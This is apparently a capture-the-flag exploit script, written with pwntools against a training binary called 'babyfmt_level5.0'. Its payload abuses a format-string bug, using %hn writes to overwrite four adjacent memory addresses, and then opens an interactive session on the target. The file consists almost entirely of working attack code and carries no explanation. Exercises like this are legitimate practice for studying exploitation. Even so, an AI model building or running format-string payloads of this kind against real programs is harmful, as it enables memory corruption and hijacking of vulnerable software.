#!/usr/bin/env python3

from pwn import *

exe = ELF("./babyfmt_level5.0")

context.binary = exe

gdb_script = """
b *func+430
c
"""

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r,gdb_script)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()

    payload = b"AAA%900c%40$hn%13861c%42$hn%14921c%41$hn%22138c%43$hnAAAAAAA" + p64(0x404150) + p64(0x404152) + p64(0x404154) + p64(0x404156)
    r.sendline(payload)
    r.interactive()


if __name__ == "__main__":
    main()
